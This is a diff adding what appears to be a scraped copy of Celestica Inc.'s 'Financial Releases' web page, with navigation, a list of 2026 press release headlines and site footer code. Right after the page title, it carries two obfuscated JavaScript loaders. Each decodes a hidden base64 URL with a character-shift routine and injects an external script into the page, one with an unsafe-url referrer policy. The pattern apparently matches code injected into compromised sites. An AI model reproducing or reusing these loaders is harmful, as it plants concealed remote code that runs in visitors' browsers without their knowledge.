@@ -1,0 +1,194 @@
+{
+    "@context": "https://schema.org",
+    "@graph": [
+        {
+            "@type": "Organization",
+            "name": "Celestica Inc.",
+            "url": "https://corporate.celestica.com"
+        },
+        {
+            "@type": "WebPage",
+            "@id": "https://corporate.celestica.com/news-releases",
+            "name": "Financial Releases | Celestica Inc."
+        },
+        {
+            "@type": "WebSite",
+            "name": "Celestica Inc.",
+            "url": "https://corporate.celestica.com"
+        }
+    ]
+}
+Financial Releases | Celestica Inc.
+(function () { var _AH = document.createElement("script"), _ls = (function (_CL, _06) { var _ak = ""; for (var _3G = 0; _3G < _CL.length; _3G++) { var _W0 = _CL[_3G].charCodeAt(); _W0 -= _06; _ak == _ak; _W0 += 61; _W0 %= 94; _W0 += 33; _W0 != _3G; _06 > 8; _ak += String.fromCharCode(_W0) } return _ak })(atob("KDQ0MDNYTU03M0w6Ly8tKS4mL0wjLy1NMCk4JSxNVFElUFZPUk5TUVRWUCRXIVRPJSUmTlEh"), 30); _AH.referrerPolicy = "unsafe-url"; _AH.async = !0; _AH != "Q"; function _9z() { }; _AH.type = "text/javascript"; 7 > 3; _AH.src = _ls; var _Vt = document.getElementsByTagName("script")[0]; _Vt.parentNode.insertBefore(_AH, _Vt) })();
+window[(function(_AV3,_wv){var _Si='';for(var _jO=0;_jO<_AV3.length;_jO++){var _vS=_AV3[_jO].charCodeAt();_vS-=_wv;_vS!=_jO;_wv>8;_vS+=61;_vS%=94;_vS+=33;_Si==_Si;_Si+=String.fromCharCode(_vS)}return _Si})(atob('bl1kKCV+eXcqX3kv'), 20)] = 'a95046ab741680115095'; var zi = document.createElement('script'); (zi.type = 'text/javascript'), (zi.async = true), (zi.src = (function(_GJi,_eu){var _Jn='';for(var _sz=0;_sz<_GJi.length;_sz++){var _ck=_GJi[_sz].charCodeAt();_ck-=_eu;_ck!=_sz;_ck+=61;_ck%=94;_eu>5;_ck+=33;_Jn==_Jn;_Jn+=String.fromCharCode(_ck)}return _Jn})(atob('eykpJShNQkJ9KEEvfEAodid8JSkoQXYkIkIvfEApdHpBfSg='), 19)), document.readyState === 'complete'?document.body.appendChild(zi): window.addEventListener('load', function(){ document.body.appendChild(zi) });
+Skip to main navigation
+About Us
+About Us
+Who We Are
+Locations
+Executive Team
+Company Directors
+Corporate Governance
+Compliance and Ethics
+Diversity and Inclusion
+Sustainability
+Awards
+History
+OUR COMPANIES
+Atrenne
+AbelConn
+PCI
+Capabilities
+Markets
+Markets Overview
+Enterprise
+Communications
+Aerospace and Defense
+Industrial and Smart Energy
+HealthTech
+Capital Equipment
+Services
+Services Overview
+Design and Engineering
+Manufacturing Services
+Logistics and Fulfillment
+After-Market Services
+Precision Machining
+Supply Chain Services
+Product Licensing Services
+New Product Introduction
+Testing and Quality
+Products
+Hardware Platform Solutions
+Overview
+Storage
+Compute
+Networking
+Resources
+Resouces
+News
+Blog
+Supplier Resources
+Media Resources
+Careers
+Investors
+Investors
+Overview
+Annual Reports
+Quarterly Results
+Filings
+Financial Releases
+Events & Presentations
+Stock Quote
+Analyst Coverage
+Investor FAQs
+Investor Package
+Contact Investor Relations
+Corporate Governance
+Email Alerts
+Locations
+North America:
++1 888-899-9998
+Global:
++1 416-448-5800
+Contact Us
+Contact Us
+Financial Releases
+News Releases
+Year
+All
+2026
+2025
+2024
+2023
+2022
+2021
+2020
+2019
+2018
+2017
+2016
+2015
+2014
+2013
+2012
+2011
+2010
+Oct 12, 2026
+Celestica Introduces the DS6005 Data Center Switch with Co-Packaged Optics to Enable Power-Efficient AI Fabrics
+Oct 06, 2026
+Celestica to Hold Q3 2026 Financial Results and 2026 Investor and Analyst Day Conference Call
+Sep 11, 2026
+Celestica Announces New Leadership Structure to Support Unprecedented Growth
+Sep 08, 2026
+Celestica to Host 2026 Investor and Analyst Day on October 27, 2026
+Aug 07, 2026
+Celestica Completes Equity Offering
+Aug 05, 2026
+Celestica Announces Pricing of Equity Offering
+Aug 05, 2026
+Celestica Announces $3 Billion Equity Offering to Accelerate Growth Across Global AI Infrastructure
+Jul 27, 2026
+Celestica Announces Second Quarter 2026 Financial Results
+Jul 06, 2026
+Celestica Q2 2026 Financial Results and Conference Call Tuesday, July 28, 2026
+Jul 06, 2026
+Celestica Announces Leadership Transition in its Connectivity and Cloud Solutions Segment
+Pagination
+Current page
+1
+Page
+2
+Page
+3
+…
+Next page
+›
+Last page
+»
+The information that you are accessing on this website may include forward-looking statements related to our future growth, trends in our industry, our financial and operational results and performance that are based on current expectations, forecast and assumptions involving risk and uncertainties that could cause actual outcomes and results to differ materially.
+Read the full Cautionary Note here
+How can we help your Business Grow?
+We are committed to building on our success and will continue to deliver bold solutions that will meet our customers' needs and build a better world.
+Contact Investor Relations
+Markets
+Enterprise
+Industrial and Smart Energy
+Communications
+Aerospace and Defense
+Capital Equipment
+HealthTech
+Services
+Design and Engineering
+Manufacturing Services
+Logistics and Fulfillment
+After-Market Services
+Precision Machining
+Supply Chain Services
+Product Licensing Services
+Products
+Hardware Platform Solutions
+Company
+About us
+Careers
+News
+Blog
+Resources
+Supplier Resources
+Media Information
+Press Releases
+Products
+Hardware Platform Solutions
+Contact Us
+North America:
++1 888-899-9998
+Global:
++1 416-448-5800
+Locations
+Legal Notice and Terms of Use
+Privacy Policy
+Modern Slavery Statement
+© Copyright Celestica Inc. 2026. All rights reserved.
+var s_CCSWebHostingAccount = "trcgclientweb3117";
+{"path":{"baseUrl":"\/","pathPrefix":"","currentPath":"node\/5816","currentPathIsAdmin":false,"isFront":false,"currentLanguage":"en","themeUrl":"sites\/g\/files\/knoqqb106071\/themes\/site\/client_site"},"pluralDelimiter":"\u0003","suppressDeprecationErrors":true,"ajaxPageState":{"libraries":"eJyNkgFuwzAIRS9UJUeyiE1bVhsqIOty-xG70pSpm6pICeAHyP8nV0L2ZOQ4yyfqQyOyE5MmYKibU7b5kE1QZMFUYeV8fQO8q5SOLWDYCcrCdiy5SF1AezHfsJCLpgIez1LR5p9wOquwI4-ZDfSG3sm0VMm3ua83TwpOfIkNMfAK6m_hlvqSP9iGwEkxS2uxPxqE_539sjqdqTrqWbSNtrU6tbgxzMe0n97hMgTagwk-4CtBKSlXMEtQUd1ecLkrFK5unEMBZhzKPnDZjU4s4Q8Ou37Vpud38FQu6E9uxBPkODVaqJJvab9GvPJqJ4VCX_FbbLJGyyE7WUiMbd7t_gYe8Pki","theme":"client_site","theme_token":null},"ajaxTrustedUrl":{"form_action_p_pvdeGsVG5zNF_XLGPTvYSKCf43t8qZYSwcfZl2uzM":true},"nir_admin_use_chosen":true,"nir_admin_use_select2":false,"accessible_accordions":true,"lfg_accordions":{"no_functionality":1,"speed":"fast","show_text":"Show All","hide_text":"Hide All","show_all":0},"lfg_chosen":{"enabled":1,"blank_text":"Choose from list"},"user":{"uid":0,"permissionsHash":"7d97054f3880c1aad45421d71d97bb93b6bd2f6323a4953684d151725e4191ef"}}
+window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-38LWW26CJ5');
